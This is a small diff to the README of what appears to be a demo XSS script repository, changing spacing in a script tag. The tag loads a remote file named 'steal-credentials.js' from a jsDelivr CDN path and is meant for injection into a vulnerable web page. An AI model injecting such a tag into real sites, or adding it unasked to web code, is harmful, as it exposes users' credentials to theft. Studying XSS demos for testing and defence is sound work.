@@ -8,7 +8,7 @@ This is a demo XSS script that can be injected into a vulnerable web application
 
 The script can be referenced from a script tag using jsdelivr CDN:
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/barrcodes/xss/steal-credentials.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/barrcodes/xss/steal-credentials.js" ></script>
 
 # To access a specific version
 
